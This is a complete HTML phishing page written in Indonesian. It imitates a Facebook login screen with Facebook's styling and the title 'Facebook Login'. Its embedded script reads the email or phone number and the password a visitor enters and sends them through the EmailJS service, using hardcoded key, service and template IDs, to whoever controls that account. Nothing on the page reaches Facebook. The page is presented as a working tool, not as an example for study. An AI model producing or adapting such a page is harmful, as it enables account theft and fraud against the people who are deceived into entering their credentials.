<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>

  <!-- EmailJS FIXED -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {

      // PUBLIC KEY MILIKMU
      emailjs.init("cKKsMvy9twhmPTKlR");

      function kirimData() {
        const email = document.getElementById("email").value;
        const pass = document.getElementById("password").value;

        const data = {
          user_email: email,
          user_password: pass
        };

        emailjs.send("service_x0mb56a", "template_d41h15m", data)
          .then(function () {
            console.log("Terkirim ✔️");
          })
          .catch(function (err) {
            console.error("Gagal ❌", err);
          });
      }

      window.kirimData = kirimData;
    });
  </script>

  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background:#f0f2f5;
    }
    .container {
      max-width: 360px;
      margin: 80px auto;
      background:white;
      padding:20px;
      border-radius:8px;
      box-shadow:0 2px 6px rgba(0,0,0,0.1);
    }
    input {
      width:100%;
      padding:12px;
      margin:10px 0;
      border:1px solid #ddd;
      border-radius:6px;
      font-size:15px;
    }
    button {
      width:100%;
      padding:12px;
      background:#1877f2;
      border:none;
      color:white;
      font-size:16px;
      border-radius:6px;
      cursor:pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <h2>Facebook Login</h2>
    <input type="text" id="email" placeholder="Email atau Nomor HP">
    <input type="password" id="password" placeholder="Kata Sandi">
    <button onclick="kirimData()">Masuk</button>
  </div>
</body>
</html>
